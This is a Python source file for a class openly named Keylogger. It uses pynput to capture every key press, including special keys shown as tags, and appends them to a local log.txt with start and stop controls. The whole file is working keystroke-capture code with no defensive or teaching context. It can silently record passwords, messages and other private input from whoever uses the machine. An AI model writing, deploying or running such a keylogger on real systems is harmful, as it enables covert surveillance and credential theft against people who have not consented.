from pynput.keyboard import Listener, Key

class Keylogger:
    def __init__(self, log_file='log.txt'):
        self.log_file = log_file
        self.listener = None

    def write_to_file(self, key):
        try:
            if isinstance(key, Key):
                if key == Key.space:
                    letter = ' '
                elif key == Key.enter:
                    letter = '\n'
                elif key == Key.backspace:
                    letter = '[BACKSPACE]'
                elif key == Key.tab:
                    letter = '[TAB]'
                elif key == Key.esc:
                    letter = '[ESC]'
                elif key == Key.shift or key == Key.shift_r or key == Key.shift_l:
                    letter = '[SHIFT]'
                elif key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
                    letter = '[CTRL]'
                elif key == Key.alt or key == Key.alt_l or key == Key.alt_r:
                    letter = '[ALT]'
                elif key == Key.caps_lock:
                    letter = '[CAPSLOCK]'
                elif key == Key.num_lock:
                    letter = '[NUMLOCK]'
                elif key == Key.scroll_lock:
                    letter = '[SCROLLLOCK]'
                else:
                    letter = f'[{key}]'
            else:
                letter = key.char

            with open(self.log_file, 'a') as f:
                f.write(letter)
        except Exception as e:
            print(f"Error: {e}")

    def start(self):
        self.listener = Listener(on_press=self.write_to_file)
        self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
